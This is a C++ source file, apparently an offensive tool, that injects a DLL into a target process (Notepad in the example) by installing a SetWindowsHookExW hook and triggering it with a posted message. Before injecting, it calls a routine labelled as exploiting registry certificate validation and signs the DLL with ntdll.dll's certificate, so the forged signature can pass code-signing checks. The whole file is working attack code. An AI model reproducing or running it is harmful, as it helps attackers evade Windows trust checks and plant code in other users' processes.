#include <Windows.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <iostream>
#include <xstring>
#include <chrono>
#include <thread>
#include <fstream>
#pragma comment(lib, "Shlwapi.lib")

#include "Tools/registry.hpp"
#include "Tools/portable_executable.hpp"
#include "Tools/util.hpp"

//-------------------------------------------------------------
// Injection To Target Process (SetWindowsHookExW)
//-------------------------------------------------------------
bool InjectModuleToProcess( const std::string ll_file_name, const std::string target_window_name )
{
	/* Check If Our Dll Exists */
	std::ifstream image_file( ll_file_name.c_str( ) );

	if ( !image_file ) {

		printf( "[-] Couldn't Find Image File" );
		std::this_thread::sleep_for( std::chrono::seconds( 2 ) );
		return false;
	}

	/* Exploit Registry Certificate Validation */
	registry::exploit_registry( );

	/* Get ntdll.dll */
	pe ntdll_file( R"(C:\windows\system32\ntdll.dll)" );

	/* Get Our File */
	pe our_file( ll_file_name );

	/* Get ntdll.dll Certificate */
	auto ntdll_certificate = ntdll_file.certificate( );

	/* Sign Our File Using ntdll.dll's Certificate */
	our_file.sign( ntdll_certificate );

	/* Reset Registry Exploit */
	registry::reset_registry( );

	/* Load Image */
	const auto loaded_library = LoadLibraryA( ll_file_name.c_str( ) );

	if ( !loaded_library ) {

		printf( "[-] Failed To Load Library" );
		std::this_thread::sleep_for( std::chrono::seconds( 2 ) );
		return false;
	}

	/* Get Target Window */
	const auto window = FindWindowA( target_window_name.c_str( ), nullptr );

	if ( !window ) {

		printf( "[-] Couldn't Find Window" );
		std::this_thread::sleep_for( std::chrono::seconds( 2 ) );
		return false;
	}

	/* Get Target Thread Id */
	const auto thread_id = GetWindowThreadProcessId( window, nullptr );

	/* Get Address Of Our Code/Function */
	const auto our_export_function = GetProcAddress( loaded_library, "OurFunction" );

	if ( !our_export_function ) {

		printf( "[-] Couldn't Export Function" );
		std::this_thread::sleep_for( std::chrono::seconds( 2 ) );
		return false;
	}

	/* Place Hook On Our Dll's Exported Function Which results in Target Process Calling The Function for Us When Event Hits*/
	/* Can be Done With Other Methods See This: https://docs.microsoft.com/en-us/windows/win32/api/winddi/nf-winddi-engcreatewnd */
	auto hook = SetWindowsHookExW( WH_GETMESSAGE, ( HOOKPROC )our_export_function, loaded_library, thread_id );

	if ( !hook ) {

		printf( "[-] Couldn't Place Hook" );
		std::this_thread::sleep_for( std::chrono::seconds( 2 ) );
		return false;
	}

	/* Trigger The Hook */
	PostThreadMessageW( thread_id, WM_USER + 400, 0, 0 );

	/* Remove Hook */
	UnhookWindowsHookEx( hook );

	return true;
}

//-------------------------------------------------------------
// Main Function Of Process
//-------------------------------------------------------------
int main( int argc, char* argv[] )
{
	bool injection_status = InjectModuleToProcess( "Test-DLL.dll" /* Our DLL Name */, "Notepad" /* Target Window Class Name */ );

	if ( !injection_status )
		printf( "[-] Failed To Inject" );
	else
		printf( "[+] Successfully Injected Module" );

	std::this_thread::sleep_for( std::chrono::seconds( 3 ) );

	return 0;
}
